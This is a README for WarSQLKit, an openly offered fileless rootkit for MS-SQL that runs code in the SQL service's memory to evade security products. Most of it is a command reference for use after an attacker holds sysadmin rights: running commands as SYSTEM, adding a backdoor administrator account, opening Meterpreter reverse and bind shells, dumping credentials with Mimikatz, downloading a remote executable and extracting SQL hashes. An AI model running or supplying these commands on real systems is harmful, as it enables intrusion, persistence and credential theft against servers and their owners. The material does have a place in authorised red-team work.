# MSSQL Fileless Rootkit - WarSQLKit

![MSSQL Fileless Rootkit - WarSQLKit](https://eyupcelik.com.tr/wp-content/uploads/2017/09/WarSQLKit.png)

WarSQLKit is a fileless rootkit and attack tool I developed for MS-SQL. With this tool you can rootkit the SQL service that uses CLR on MS-SQL servers. Thus, malicious code can be executed in the process memory of the SQL service without creating a malicious function in the operating system or file system, and security products and technologies can be bypassed. The tool was developed considering a scenario in which an account with "sysadmin" rights is obtained and none of the stored procedures such as "xp_cmdshell", "sp_OACreate", "sp_OAMethod" are running. This tool will show you that MS-SQL is much more than these stored procedures.

I described the tool and the techniques I used to develop it in a red team test for a client in 2016 and decided to share it as open source a year later in 2017. 

WarSQLKit is suitable for refactoring and combining with other tools and techniques. You can find the techniques and methods used in the tool in my blog below.

https://eyupcelik.com.tr/mssql-fileless-rootkit-warsqlkit/

# WarSQLKit Command Example
```sql
EXEC sp_cmdExec 'whoami'; => Any Windows command
EXEC sp_cmdExec 'whoami /RunSystemPriv'; => Any Windows command with NT AUTHORITY\SYSTEM rights
EXEC sp_cmdExec '"net user eyup P@ssw0rd1 /add" /RunSystemPriv'; => Adding users with RottenPotato (Kumpir)
EXEC sp_cmdExec '"net localgroup administrators eyup /add" /RunSystemPriv'; => Adding user to localgroup with RottenPotato (Kumpir)
EXEC sp_cmdExec 'powershell Get-ChildItem /RunSystemPS'; => (Powershell) with RottenPotato (Kumpir)
EXEC sp_cmdExec 'sp_meterpreter_reverse_tcp LHOST LPORT GetSystem'; => x86 Meterpreter Reverse Connection with  NT AUTHORITY\SYSTEM
EXEC sp_cmdExec 'sp_x64_meterpreter_reverse_tcp LHOST LPORT GetSystem'; => x64 Meterpreter Reverse Connection with  NT AUTHORITY\SYSTEM
EXEC sp_cmdExec 'sp_meterpreter_reverse_rc4 LHOST LPORT GetSystem'; => x86 Meterpreter Reverse Connection RC4 with  NT AUTHORITY\SYSTEM, RC4PASSWORD=warsql
EXEC sp_cmdExec 'sp_meterpreter_bind_tcp LPORT GetSystem'; => x86 Meterpreter Bind Connection with  NT AUTHORITY\SYSTEM
EXEC sp_cmdExec 'sp_Mimikatz'; 
select * from WarSQLKitTemp => Get Mimikatz Log. Thnks Benjamin Delpy :)
EXEC sp_cmdExec 'sp_downloadFile http://eyupcelik.com.tr/file.exe C:\ProgramData\file.exe 300';  => Download File
EXEC sp_cmdExec 'sp_getSqlHash';  => Get MSSQL Hash
EXEC sp_cmdExec 'sp_getProduct';  => Get Windows Product
EXEC sp_cmdExec 'sp_getDatabases';  => Get Available Database
```
